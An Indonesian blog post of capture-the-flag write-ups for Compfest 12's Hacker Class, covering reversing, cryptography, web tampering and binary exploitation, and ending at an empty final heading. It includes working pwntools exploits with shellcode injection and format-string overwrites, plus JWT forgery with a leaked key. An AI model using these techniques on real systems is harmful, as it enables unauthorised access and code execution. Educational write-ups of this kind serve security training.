---
layout: post
title: "Compfest 12 - Hacker Class WriteUp"
date: 2020-08-18 12:17:56 +0530
categories:
  - WriteUp
  - HackerClass
---

Berikut Writeup Beberapa Kategori Soal Pada Hacker Class Compfest 2020.

<br />  


# Reverse

## 1. Math Function [50 pts]

Diberikan file python bernama `soal.py`, dimana program meminta inputan sebesar 4 digit, yang nantinya akan dikonversikan menjadi suatu list desimal. Lalu, akan dikalikan dengan variable data. (Konsep perkalian matrix biasa)

```py
import numpy as np
import hashlib
from string import *
data = np.array([[50, 11, 18, 12], [18, 12, 23, 2], [21, 11, 35, 42], [47, 2, 12, 40]])

my_input = input()
password = np.array(list(map(ord, list(my_input[:4].ljust(4, '\x00')))))
result = list(np.matmul(data, password))

if result == [7681, 4019, 7160, 8080]:
	print("Congratz, here is your flag: COMPFEST12{" + hashlib.sha384(bytes(my_input.encode())).hexdigest() + "}")

```

Dilakukan pencarian password yang valid dengan bantuan z3 solver. Berikut solvernya.

```py
from z3 import *

s = Solver()
key = [BitVec('key{}'.format(i), 32) for i in range(4)]

flag = [[50, 11, 18, 12], [18, 12, 23, 2], [21, 11, 35, 42], [47, 2, 12, 40]]
target = [7681, 4019, 7160, 8080]

for i in range(4):
	s.add(key[i] <= 255, key[i] >= 0 )
	
s.add( 
	(key[0]*flag[0][0]) +
	(key[1]*flag[0][1]) +
	(key[2]*flag[0][2]) +
	(key[3]*flag[0][3]) == 7681
)
s.add( 
	(key[0]*flag[1][0]) +
	(key[1]*flag[1][1]) +
	(key[2]*flag[1][2]) +
	(key[3]*flag[1][3]) == 4019
)
s.add( 
	(key[0]*flag[2][0]) +
	(key[1]*flag[2][1]) +
	(key[2]*flag[2][2]) +
	(key[3]*flag[2][3]) == 7160
)
s.add( 
	(key[0]*flag[3][0]) +
	(key[1]*flag[3][1]) +
	(key[2]*flag[3][2]) +
	(key[3]*flag[3][3]) == 8080
)

if s.check() == sat:
    m = s.model()
    keys = ''
    for k in key:
        keys += chr(m[k].as_long())
    print keys

```

Jalankan akan memunculkan : `n!C3`. Input ke soal dan didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/FLAG-1.png)

### FLAG

`COMPFEST12{c9ba50e8ec889ec57e3181a060f871968b3914b4e912f43d05113e901b7f555698c45871f96189cfc50062f0bd21f793}`\
<br />


## 2. Half Life 3 [103 pts]

Diberikan file python, berikut isi filenya.

```py
(lambda x: print('Congratz, here is your flag: COMPFEST12{' + x + '}') if (lambda a: int((lambda b: ''.join([chr((ord(i)-97+1+(1^2))%26+97) for i in b]))(a), 36) if all([i in __import__('string').ascii_lowercase[-1:]+__import__('string').ascii_lowercase[:-1] for i in a]) else -1)(x) == 16166842727364078278681384436557013 else print('Nope'))(input().lower())
```

Dimana inputan akan dishift (caesar cipher), lalu dikorversi kedalam bilangan berbasis 36. Lalu akan dibandingkan apakah hasilnya `16166842727364078278681384436557013`. Untuk itu, tinggal decode hasil yang diinginkan kedalam bentuk ascii, lalu dishift kekiri 24 kali dan didapatkan input yang dicari.

```py
#!/usr/bin/python

def base36encode(s):
    charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    result = ''
    while(s):
        a = s/36
        b = 36*a
        result += charset[s-b]
        s = a
    return result[::-1]

cipher = 16166842727364078278681384436557013

b = base36encode(cipher)
print ''.join([chr((ord(i)-97-24)%26+97) for i in b])

```

Jalankan, akan mengeluarkan: `thatwasntthathardright`. Input pada `soal.py` didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/FLAG-2.png)

### FLAG

`COMPFEST12{thatwasntthathardright}`\
<br />


## 3. Unyu [183 pts]

Diberikan sebuah alamat url, yang didalamnya terdapat field untuk menginput password. 

```javascript
let ans = [246, 56, 101, 211, 75, 28, 215, 26, 173, 48, 141, 250, 238, 6, 102, 39, 227, 26, 102, 173, 214, 102, 27, 6, 95, 241, 102, 246, 41, 250, 250, 182];
let input = e.target.value;
let guess = [];
for (let i = 0; i < input.length; i++) {
    guess.push(input.charCodeAt(i) ** 128 % 251);
}
console.log(String(ans) + "\n\n\n" + String(guess));
if (String(guess) == String(ans)) {
    this.setState({ message: "Congrats, it's a right flag" });
}
```

Inputan akan dikonversikan kedalam bentuk desimal, lalu dipangkat 128, modulus 251. Selanjutnya dilakukan pencarian terhadap password yang dicari dengan bantuan module `Math` dalam python.

```python
from itertools import product
import string
import math

ans = [246, 56, 101, 211, 75, 28, 215, 26, 173, 48, 141, 250, 238, 6, 102, 39, 227, 26, 102, 173, 214, 102, 27, 6, 95, 241, 102, 246, 41, 250, 250, 182] 
guess = [ [] for i in range(len(ans)) ]

for i in range(len(ans)):
    for s in string.printable:
        c = int(math.pow(ord(s), 128) % 251)
        if c == ans[i]:
            guess[i].append(s)

# Karena entah mengapa 'F' tidak bersesuaian dengan yang diinginkan, maka disini saya menambahkan secara manual.
guess[4] = ['F']

for s in product(*guess):
    flag = ''.join(s)
    if flag.startswith("COMPFEST12{tH3_c4T_15_v3rY_"):
        print flag
```

Karena password yang dihasilkan lebih dari 1, maka dilakukan permutasi dari semua password-password yang didapat hingga kira-kira membentuk suatu kalimat dan benar ketika disubmit.

![FLAG](https://abdullahnz.github.io/assets/images/FLAG-3.png)

### FLAG

`COMPFEST12{tH3_c4T_15_v3rY_Cute}`\
<br />

## 4. Soal DDP [436 pts]

Diberikan file python yang panjang, berikut alur men-enkripsi-an inputan.

```py
jxl = ord

def wg(xy):
    fgx = []
    i = 3
    fxg = getattr(fgx, "append")
    for _ in map(fxg, map(jxl, xy)):
        i <<= i ^ i
    return fgx

x = input("Enter an input:")
gw = wg(x)
```

Inputan pertama kali dienkripsi dalam fungsi `wg` yang dimana fungsi tersebut, inputan kita dikonversikan kedalam bentuk list desimal. Yang selanjutnya hasilnya akan diproses dalam fungsi `hh`.

```py
sw = "{}(gw)".format
ww = exec
def kl(xx):
    ww(sw(xx))

kl("h"*2)
```

Fungsi `hh` hanya menambahkan nilai dari nilai desimal inputan, dengan index inputan tersebut ditambah satu. `(x[i] = x[i]+(i+1))`

```py
def master(f, xx, yy=0):
    if yy == len(xx):
        return xx
    f(xx, yy)
    return master(f, xx, yy + 1)

def hh(xx):
    def ff(aa, bb):
        aa[bb] += (bb + 0b1) if (bb & 0o1) else (bb | 0x1)
    return master(ff, xx)

```

Lalu, hasil dari enkripsi tersebut, akan diproses dalam fungsi `jj`.

```py
def master(f, xx, yy=0):
    if yy == len(xx):
        return xx
    f(xx, yy)
    return master(f, xx, yy + 1)

def jj(xx):
    def ff(aa, bb):
        aa[bb] = ((0xF & aa[bb]) << 4) + ((aa[bb] >> 4))

    return master(ff, xx)

kl("jj")

```

Penulis tidak mereverse fungsi tersebut, tetapi dengan melihat pola enkripsi, penulis dapat mendekripsi pesan yang diproses oleh fungsi tersebut.

```py
>>> for i in range(30):
...   print i, jj([i])
... 
0 [0]
1 [16]
2 [32]
3 [48]
4 [64]
5 [80]
6 [96]
7 [112]
8 [128]
9 [144]
10 [160]
11 [176]
12 [192]
13 [208]
14 [224]
15 [240]
16 [1]
17 [17]
18 [33]
19 [49]
20 [65]
21 [81]
22 [97]
23 [113]
24 [129]
25 [145]
26 [161]
27 [177]
28 [193]
29 [209]

```

Kita lihat, pola pengenkripsian adalah `(n * 16 % 255)`. Maka dengan menggukanan fungsi ini lagi, akan didapatkan hasil dekripsi dari fungsi ini.

```py
>>> jj([1])     # encrypt 1 = 16
[16]
>>> jj([16])    # decrypt 16 = 1
[1]
>>> jj([80])    # encrypt 80 = 5
[5]
>>> jj([5])     # decrypt 5 = 80
[80]
```

Fungsi terakhir, dimana proses enkripsi diambil dari index terakhir ke index awal (reverse), lalu tiap bit dari text, akan digeser kekiri sebanyak `(yx << 3)` / Bitwise Operator. Lalu, hasilnya tersebut akan dijumlahkan dengan pengenkripsi index selanjutnya sampai selesai.

```py
def pw(xx, yx=0, xy=0, xjl=None, llx=None):
    if xjl is None:
        llx=xx.pop
        xjl=jlx(xx)
    if yx < xjl:
        return pw(xx, yx+1, xy + (llx() << (yx << 3)), xjl, llx)
    return xy
```

Disini, `(yx << 3)` akan bernilai kelipatan 8, dari 0. (0, 8, 16, 24, dll). Untuk itu, dengan menggeser kekanan sebanyak `(yx << 3)` dari hasil enkripsi, akan mendapatkan hasil deskripsi teks index terakhir. Setelah itu, karena sudah bisa mendapat hasil dekripsi text dari index terakhir, maka bitwise kekiri lagi hasil dekripsi pada index tersebut yang didapat, lalu jumlah terakhir angka hasil enkripsi flag dikurangi dengan hasil bitwise tadi, akan didapatkan jumlah enkripsi sebelumnya. Lakukan sampai nilai hasil enkripsi flag habis.

```py
#!/usr/bin/python2

from string import *

def llx_flag(x, length):
    result = []
    for i in range(length, -1, -1):
        y  = (x>>(8*i))
        z  = (y<<(8*i))
        x -= z
        result.append(int(y))

    return result

target = 120290679218832191630163797978118096998325980286646140214484761791004452553

for length_flag in range(20, 50):
    valid_flag = llx_flag(target, length_flag)

    for i in range(len(valid_flag)):
        temp = valid_flag[i] * 16 % 0xff
        valid_flag[i] = temp - (i+1)

    flag = ''.join([chr(flag) for flag in valid_flag])
    if flag.startswith("COMPFEST"):
        print flag
        break

```

Karena kita tidak tahu panjang flag, maka bruteforce panjang flag, dan mencetak flag ketika flag didapatkan.

![FLAG](https://abdullahnz.github.io/assets/images/FLAG-4.png)

### FLAG

`COMPFEST12{w0W_u_c4n_r3Ad_w3lL}`\
<br />

## 5. No Inject Inject Ya [486 pts]

Diberikan sebuah url menuju web yang menggunakan bahasa PHP. Penulis sempat stuck karena tidak memperhatikan dengan benar (Entah mengapa mikirnya ke RCE terus :v). 

```php
<?php
    $input = $_GET['input'];
    if (!isset($input)) {
        highlight_file(__FILE__);
        exit(0);
    }
    if (!is_string($input)) {
        die("No inject inject bang");
    }
    if (strpos($input, '\'') !== false) {
        die("No inject inject bang");
    }
    system("./readFlag '" . $input . "'");
?>
```

Download `./readFlag` pada `http://128.199.104.41:23109/readFlag`. Lalu decompile menggunakan IDA.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [sp+14h] [bp-1Ch]@3
  int v5; // [sp+18h] [bp-18h]@4
  int v6; // [sp+1Ch] [bp-14h]@4

  if ( strlen(argv[1]) != 42 )
    lose();
  for ( i = 0; i < strlen(argv[1]); i += 2 )
  {
    v5 = argv[1][i];
    v6 = argv[1][i + 1];
    if ( v5 + v6 != answer[i] || v6 * v5 != answer[i + 1] )
      lose();
  }
  puts("Mantap bang");
  return 0;
}
```

Binary mengambil inputan pada argument ke-1. Inputan dibandingkan dalam perulangan bilangan genap.

1. input[i] + input[i+1] == answer[i]
2. input[i] * input[i+i] == answer[i+1]

Ambil isi dari variable answer, lalu dilakukan pencarian dengan menggunakan z3. Berikut solvernya.

```py
from z3 import *

answer = [0x00000092, 0x000014ad, 0x0000009d, 0x00001810, 0x0000008b, 0x000012de, 0x000000a7, 0x00001b3c, 0x00000063, 0x00000992, 0x000000dd, 0x00002f16, 0x000000d3, 0x00002b66, 0x000000d3, 0x00002b32, 0x000000ca, 0x000027b5, 0x000000cf, 0x000029ae, 0x000000cd, 0x000028d2, 0x000000ce, 0x00002931, 0x000000d7, 0x00002d1e, 0x000000cf, 0x000029d2, 0x000000d7, 0x00002cdc, 0x000000c8, 0x000026f7, 0x000000d8, 0x00002d8c, 0x000000c8, 0x0000270f, 0x000000d3, 0x00002b0c, 0x000000db, 0x00002ed4, 0x000000e9, 0x000034bc]

s = Solver()
v5 = [BitVec('v5[{}]'.format(i), 32) for i in range(42)]

for i in range(len(v5)):
    s.add(v5[i] >= 0, v5[i] <= 256)

for i in range(0, 42, 2):
    s.add(v5[i] + v5[i+1] == answer[i], v5[i] * v5[i+1] == answer[i+1])

if s.check() == sat:
    m = s.model()
    flag = ""
    for i in v5:
        flag += chr(m[i].as_long())
    print flag
else:
    print ":'("

```

Didapatkan flag tetapi dengan tertukar-tukar antara index genap dengan index setelahnya.

![FLAG](https://abdullahnz.github.io/assets/images/FLAG-5.png)

Dengan memindahkan index-index yang tertukar secara manual, dan didapatkan flag yang benar.

### FLAG

`COMPFEST12{benar_kan_no_inject_inject_lol}`\
<br/>
<br/>

# Binary Exploitation

## 1. Easy Buffer Overflow [50pts]

Diberikan file binary beserta sourcenya. Berikut source code-nya.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char const *argv[])
{
	setvbuf(stdout, NULL, _IONBF, 0);
	int hack_me = 0x2;
	char buf[10];

	puts("Enter a number (Max 10 digits)");
	gets(buf);

	if(hack_me > 0x2)
		system("echo \"Hi, here is your flag\"; cat flag.txt");
	else
		puts("Ok thanks");
	return 0;
}
```

Untuk mendapatkan flag, nilai variable `hack_me` harus lebih dari 2. Inputan disimpan pada variable buf yang memiliki panjang 10 karakter, dengan input melebihi 10 karakter, inputan kita akan masuk ke variable `hack_me` karena input diambil dengan fungsi `gets` yang memiliki bug buffer overflow.

![FLAG](https://abdullahnz.github.io/assets/images/PWN-1.png)

### FLAG

`COMPFEST12{That_was_ez_right_76a7fb}`
<br />
<br />

## 2. Tempat Kembali [50pts]

Diberikan file python, bdrikut isinya.

```py
#!/usr/bin/python3

def normal():
	print('okay thanks uwu')

def winner():
	print('Congratz, here is your flag: ' + open('flag.txt').read())

real_return_address = 'normal'
my_input = input('Enter your name (max 32 characters)\n').ljust(32, '\x00')
my_input += real_return_address
return_address = my_input[32:32+6]
try:
	locals()[return_address]()
except:
	print('SIGSEGV')
```

Return address diambil pada index ke 32-38 dari inputan. Maka input sembarang dengan panjang 32 karakter lalu ditambah dengan `winner`, maka return_address akan berisi `winner`.

![FLAG](https://abdullahnz.github.io/assets/images/FLAG-6.png)

### FLAG 

`COMPFEST12{changing_return_address_is_cool_and_powerful_just_wait_for_ROP}`
<br />
<br />

## 3. Tempat Kembali 2 [152pts]

Diberikan source file python, berikut isinya.

```py
#!/usr/local/bin/python3.7

import random
import string

stack = ''.join([random.choice(string.ascii_lowercase) for j in range(100)])
rdi = ""
rsi = ""
rdx = "0"

def get_file():
	print(open(rdi, rsi).read()[:int(rdx)])

def popstack():
	global stack
	ret_val = stack[:8].strip()
	stack = stack[8:]
	return ret_val

def gadget_1():
	global rdi
	rdi = popstack()
	return_address = popstack()
	globals()[return_address]()

def gadget_2():
	global rsi
	rsi = popstack()
	return_address = popstack()
	globals()[return_address]()

def gadget_3():
	global rdx
	rdx = popstack()
	return_address = popstack()
	globals()[return_address]()

def gadget_4():
	print("test")

def vuln():
	global stack
	buf = input().ljust(32, ' ')
	stack = buf[:56] + stack
	print(buf)
	stack = stack[32:]
	return_address = popstack()
	globals()[return_address]()

def main():
	global stack
	print("Good Luck~")
	stack = "main_end".ljust(8, ' ') + stack
	vuln()

def main_end():
	print("Thank you~")

if __name__ == '__main__':
	main()
```

Tujuan kita disini adalah mengisi :

1. Mengisi variable **rdi** menjadi nama file yang berisi flag lewat fungsi **gadget_1**.
2. Mengisi variable **rsi** menjadi **r** lewat fungsi **gadget_2**.
3. Mengisi variable **rdx** menjadi lebih dari panjang flag lewat fungsi **gadget_3**.

Sehingga, ketika fungsi `get_file` dipanggil, akan menjadi seperti ini:

```py
print(open('flag', 'r').read()[:length])
```

Overwrite `return_address` ke fungsi `gadget_*` (caranya seperti pada soal sebelumnya) lalu kembali lagi ke fungsi `main` untuk overwrite `return_address` lagi ke fungsi gadget selanjutnya sampai semuanya terpenuhi. Lalu ke fungsi `get_file` untuk mendapatkan flag.

Berikut solvernya.

```py
#!/usr/bin/python

from sys import argv
from pwn import *

def roprop(addr, val=""):
    buf = 'A'*(32)
    buf += addr
    buf += val.ljust(8, ' ')
    buf += 'main'.ljust(8, ' ')
    p.sendline(buf)

def exploit(p):
    roprop('gadget_1', 'flag')
    roprop('gadget_2', 'r')
    roprop('gadget_3', '99999999')
    roprop('get_file')
    flag = p.recvall().split()[-1]
    info(flag)

if __name__ == '__main__':
    if len(argv) < 2:
        p = process(['python3', 'tempat_kembali2.py'])
    else:
        p = remote('128.199.104.41', 29661)
    exploit(p)

```

Jalankan dan didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/FLAG-7.png)

### FLAG

`COMPFEST12{https://zafirr31.github.io/posts/binary-exploitation-return-oriented-programming/`
<br/>
<br/>


## 4. Format String EZ

Diberikan file binary beserta sourcenya. Berikut isi dari source codenya.

```c
#include <stdio.h>

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);

    int target = 0;
    char name[20];

    printf("What's your name?\n");
    scanf("%s", name);
    printf("Hello, ");
    printf(name, &target);
    printf("!\n");

    if(target == 1337) {
        system("cat flag.txt");
    }
}
```

Untuk mendapatkan flag, nilai dari target harus bernilai `1337`, tetapi variable `target` sudah diinisiasikan dengan bernilai 0. Karena terdapat bug format string, kita bisa mengubah isi dari variable `target`.

Pertama, cari dulu offset alamat variable target dengan debug menggunakan gdb.

```py
   ....
   0x555555554851 <main+33>:	call   0x5555555546d0 <setvbuf@plt>
=> 0x555555554856 <main+38>:	mov    DWORD PTR [rbp-0x4],0x0
   0x55555555485d <main+45>:	lea    rdi,[rip+0x100]        # 0x555555554964
   ....

Legend: code, data, rodata, value
0x0000555555554856 in main ()

gdb-peda$ x/wx $rbp-0x4
0x7fffffffdbfc:	0x00000000
```

Alamat variable target adalah `0x7fffffffdbfc`.

```py
gdb-peda$ c
Continuing.
%p.%p.%p
Hello, 0x7fffffffdbfc.0x7fffffffdbfc.(nil)!
```

Ternyata alamat target terletak pada offset pertama. Overwrite target dengan nilai 1337 dan didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/PWN-3.png)

### FLAG 

`COMPFEST12{BewareOfFormatStringAttacks}`
<br/>
<br/>

## 5. Stack Shellcode [288pts]

Berikut source code dari soal.

```c
#include <stdio.h>

int main(int argc, char const *argv[])
{
	setvbuf(stdout, NULL, _IONBF, 0);

	char buf[400];
	printf("Here is the address of buf: %lp\n", &buf);
	printf("Now input the shellcode and run it: ");

	gets(buf);
	return 0;
}
```

Inject shellcode ditambah padding sebesar 400 bytes dikurangi panjang shellcode untuk sampai ke return address, kembali lagi ke address `buf` (tempat shellcode variable buf yang berisi shellcode) yang diberi oleh program.

Solver,

```py
#!/usr/bin/python

from pwn import *
import sys

def exploit(p):
    address = int(p.recv().split()[6], 16)
    info(hex(address))
    
    # http://shell-storm.org/shellcode/files/shellcode-806.php
    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    buf  = shellcode
    buf += "\x90"*(400-len(shellcode))
    buf += p64(address)

    p.sendline(buf)
    p.interactive()
    
if __name__ == '__main__':
    if len(sys.argv) > 1:
        p = remote('128.199.104.41', 20950)
    else:
        p = process('./stack')
    exploit(p)

```

Jalankan dan didapatkan shell.

```sh
$ python solver.py 
[+] Starting local process './stack': pid 8832
[*] 0x7ffc314ca230
[*] Switching to interactive mode
$ id
uid=1000(abdullahnz) gid=1000(abdullahnz) groups=1000(abdullahnz),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),127(wireshark)
$  
```

### FLAG 

Service mati.
<br/>
<br/>

## 6. Format String Harder [492 pts]

Berikut source code nya.

```c
#include<stdio.h>
#include<stdlib.h>

int main(int argc, char const *argv[])
{
	setvbuf(stdout, NULL, _IONBF, 0);

	char buf[20];
	int* hack_me = malloc(10);
	*hack_me = 5;

	printf("This is the location of the hack_me varible: %lp\n", hack_me);

	puts("Ok now change its value to 420");

	fgets(buf, 20, stdin);
	printf(buf);

	if(*hack_me == 420)
		system("cat flag.txt");
	else
		puts("Sorry you failed");

	return 0;
}

```

Format string attack seperti pada soal sebelumnya, tetapi soal ini diberi address variable `hack_me` (seperti pada soal stack sebelum ini) untuk dioverwrite.

Berikut solvernya.

```py
#!/usr/bin/python

from pwn import *
import sys

def exploit(p):
    hack_me = int(p.recvuntil('\nOk').split()[-2], 16)
    info("hack_me address 0x%x" %hack_me)
    buf = p32(hack_me)
    buf += '%416x%9$n'
    p.sendline(buf)
    p.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        p = remote('128.199.104.41', 42069)
    else:
        p = process('./format_harder')
    exploit(p)
```

Kenapa 416 ? setelah didebug, variable `hack_me` berisi nilai yang kita tulis + 4 (panjang alamat). Jadi harus dikurangi 4 , `( 420-4 = 416 )`

![FLAG](https://abdullahnz.github.io/assets/images/FLAG-8.png)

### FLAG

`COMPFEST12{Format_Stringing_to_win}`
<br/>
<br/>


# Cryptography

## 1. Single XOR Encryption [50pts]

Seperti judul soal yaitu XOR 1 Byte. Bruteforce kuncinya pada range 0-256 dan break ketika flag didapatkan.

```py
#!/usr/bin/python

cipher = open('soal').read().decode('hex')

for i in range(256):
    flag = ""
    for c in cipher:
        flag += chr(ord(c) ^ i)
    if 'COMPFEST' in flag:
        print i, flag
        break
```

Hasilnya, didapatkan flag dengan kunci 31.

![FLAG](https://abdullahnz.github.io/assets/images/CRYPTO-1.png)

### FLAG 

`COMPFEST12{eA5y_XoR3d_cRYp7}`\
<br/>

## 2. RSA is EZ [50pts]

Diberikan ciphertext, exponent, modulus pada file soal.txt.

```py
N: 8415585176331944770890697447889407107682842416990048034871540560346299758957847451425917174673749320615964220031435244600684984962572799318938834410939777
e: 65537
c: 1786307824629585273437772393180758862337539711854648852596448492421354797799006132748227920806015929832806927801339687233505834251424664486190121594659975
```

Cari faktorisasi p dan q dari modulus dengan `factordb.com`. Lalu lakukan dekripsi RSA seperti biasa.

```python
from gmpy2 import *

N = 8415585176331944770890697447889407107682842416990048034871540560346299758957847451425917174673749320615964220031435244600684984962572799318938834410939777
e = 65537
c = 1786307824629585273437772393180758862337539711854648852596448492421354797799006132748227920806015929832806927801339687233505834251424664486190121594659975
p = 81884890723839100444482815989398285579284675913916838202667165954650841461379
q = 102773357843438146889340595009699718240027844030512672487363551637051818965163

t = (p-1) * (q-1)
d = invert(e, t)

print hex(pow(c, d, N))[2:].decode('hex')
```

Jalankan dan didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/CRYPTO-3.png)

### FLAG

`COMPFEST12{rsa_isnt_that_hard_as_long_as_you_know_how_it_works!}`\
<br/>

## 3. Crypto-EZ [86pts]

Diberikan file untuk meng-enkripsi flag, sebagai berikut.

```py
import random as ciwi

p = #redacted
q = # redacted
n = 21311 # hint: n = p*q

flag = "" # redacted

enc = ""
for i in flag:
    enc += chr((5 * ord(i)) + ciwi.randint(1,4))

ciwi.seed(q)

enc2 = ""
for i in range(10, len(enc) + 10):
    i -= 1
    z = p + q - i
    enc2 += chr(ord(enc[i - 9]) ^ ciwi.randint(i, z))

print(enc2)

```

Cari bilangan p dan q dengan `factordb.com` yang nantinya bilangan q akan digunakan untuk mendapatkan isi dari variable `enc2`.

```py
enc = ""
for i in flag:
    enc += chr((5 * ord(i)) + ciwi.randint(1,4))
```

Karena nilai desimal flag[i] dikalikan dengan 5 dan nilai randomnya tidak lebih dari 5, maka `enc2[i] mod 5` akan mendapatkan nilai random yang ditambahkan.

Berikut solvernya,

```py
#!/usr/bin/python3

from binascii import *
import random

p = 101
q = 211 
n = 21311 # hint: n = p*q

encrypted_flag = [ ord(d) for d in open('enc', 'r').read() ]

random.seed(q)
stage_one = []
for i in range(10, len(encrypted_flag)+10):
    i -= 1
    z = p + q - i
    stage_one.append(encrypted_flag[i - 9] ^ random.randint(i, z))

flag = ''
for a in stage_one:
    b = a % 5
    flag += chr((a-b)//5)

print(flag[:-1])
```

Jalankan dan didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/CRYPTO-2.png)

### FLAG

`COMPFEST12{budayakan_jujur_dan_tamvan_007_12aba}`\
<br/>

## 4. Lab Member [442pts]

Decrypt semua secret yang dimiliki semua member dan didapatkan flag, Berikut solvernya.

```py
from Crypto.Cipher import AES
from pwn import *
from binascii import unhexlify
import itertools, os

r = remote('128.199.104.41', 25300)

def choice(num):
    r.sendlineafter('Please select a lab member (or 0 to break): ', str(num))
    r.recvuntil('0.')
    return r.recvline()

def decrypt(cipher):
    enc = hex(int(cipher))[2:].rstrip('L')
    aes = AES.new('supersecretvalue', AES.MODE_ECB)
    dec = aes.decrypt(enc.decode('hex'))
    return dec

for i in range(1, 12):
    try:
        info(decrypt(choice(i)))
    except:
        pass

```

Jalankan dan didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/CRYPTO-4.png)

### FLAG

`COMPFEST12{private_member_is_an_illusion}`\
<br/>

## 5. Military Grade Encryption [465pts]

Diberikan 4 file diantaranya aes1.py yang digunakan untuk mengekripsi flag, dan 2 file hasil enkripsi dan 1 pasang file teks beserta hasil enkripsinya.

```py
from Crypto.Cipher import AES
import hashlib

IV = "iniIVbukanflagya"
KEY = hashlib.md5(open('key.txt', 'rb').read()).hexdigest()
flag = open('flag.txt', 'rb').read()
not_flag = open('not_flag.txt', 'rb').read()


def unpad(data):
	return data[:-ord(data[-1])]

def pad(data):
	length = 16 - (len(data) % 16)
	return data + bytes([length])*length

def encrypt(message):
	aes = AES.new(KEY, AES.MODE_OFB, IV)
	message = pad(message)
	enc = aes.encrypt(message)
	return enc

def decrypt(encrypted):
	aes = AES.new(KEY, AES.MODE_OFB, IV)
	return unpad(aes.decrypt(encrypted))
	
open('flag.enc', 'wb').write(encrypt(flag))
open('not_flag.enc', 'wb').write(encrypt(not_flag))

```

Mode yang digunakan adalah OFB. Lakukan XOR `flag.enc` dengan kunci hasil dari XOR `not_flag.txt` dan `not_flag.enc` akan didapatkan flag. Berikut solvernya.

```py
#!/usr/bin/python

def xorrr(a, b):
    return [chr(ord(i)^ord(j)) for i,j in zip(a, b)]

not_flag_enc = open('not_flag.enc').read()
not_flag_txt = open('not_flag.txt').read()

key = xorrr(not_flag_enc, not_flag_txt)
flag = open('flag.enc').read()

print "".join(xorrr(flag, key))
```

Jalankan dan didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/CRYPTO-5.png)

### FLAG

`COMPFEST12{OFB_sucks_dont_use_it_no_more}`\
<br/>

# Web Exploitation

## 1. Only Admin [50pts]

Edit value cookie dari `admin` menjadi `true` dan didapatkan flag.

```sh
$ curl -XGET http://128.199.104.41:26025/ --cookie "admin=true"
COMPFEST12{congratz_haha_ez_admin_1ce9307db61}
```

### FLAG

`COMPFEST12{congratz_haha_ez_admin_1ce9307db61}`\
<br/>

## 2. Hash Hash Hashoo [50pts]

Requests parameter a dan b, tambahkan kurung balok untuk menjadikan bentuk array, isi parameter a dan b dengan isi yang berbeda, dan flag didapatkan.

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-1.png)

### FLAG 

`COMPFEST12{md5_hashing_php_is_so_bad_3087c22}`\
<br/>

## 3. Only Admin 2 [50pts]

Tambahkan `/TERSERAH` pada akhir url. Didapat debug dalam posisi hidup. Lihat config, dan didapatkan `SECRET_KEY` adalah `wanjir-itu-secret-nya-cuk-cepet-copy-3efbb717`. 

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-2.png)

Diketahui website ini menggunakan jwt untuk auth-nya. Decode jwt-token di `jwt.io`.

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-3.png)

Edit payload menjadi dibawah ini dan input secret-key yang didapat tadi.

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-4.png)

Edit cookie jwt-token pada website dengan jwt-token yang baru, refresh dan flag didapatkan.

<!-- ![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-5.png) -->
![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-6.png)

### FLAG 

`COMPFEST12{wanjir_gua_lupa_set_debug_nya_jadi_false_79f2622f}`\
<br/>

## 4. Ketik Ketik [50pts]

Diberikan website yang berisi game seperti `typeracer`, untuk mendapatkan flag, kita harus menyelesaikannya dibawah 2 detik. Namun setelah scripting dan game diselesaikan kurang dari 2 detik, tepatnya 1.XXX ms, flag tidak didapatkan. Lalu coba tamper requests menggunankan burpsuite, tekan spasi sampai game selesai.

Didapati requests data post ke `/game` sebagai berikut.

```json
{"words":["aku","ingin","menjadi","hacker","handal","aku","harus","terus","berlatih","pantang","menyerah","dapatkan","flagnya","aku","ingin","menjadi","legenda","aku","ingin","bisa","ngehack","ig","aku","akan","menggunakan","keahlianku","untuk","kebaikan"],"curr":28,"currState":-3,"answers":[-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1],"input":"","gameState":-3,"startTime":1597799704168,"lastUpdate":1597799706927,"message":"Loading ..."}
```

Berdasarkan potongan script Ketik.js berikut, ubah semua value `answer` menjadi -2 (right).

```js
const STATES = {
  wrong: -1,
  right: -2,
  noAns: -3
};
```

Setelah dikirim requests ternyata masih belum mendapatkan flag. Lalu coba ubah value `lastUpdate` menjadi seperti isi `startTime`. Kirim requests dan didapatkan flag,

Berikut akhir requests data.

```json
{"words":["aku","ingin","menjadi","hacker","handal","aku","harus","terus","berlatih","pantang","menyerah","dapatkan","flagnya","aku","ingin","menjadi","legenda","aku","ingin","bisa","ngehack","ig","aku","akan","menggunakan","keahlianku","untuk","kebaikan"],"curr":28,"currState":-3,"answers":[-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2],"input":"","gameState":-3,"startTime":1597799704168,"lastUpdate":1597799704168,"message":"Loading ..."}
```

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-7.png)

### FLAG

`COMPFEST12{you_sneaky_hacker_you!}`\
<br/>

## 5. Gekyuel [316pts]

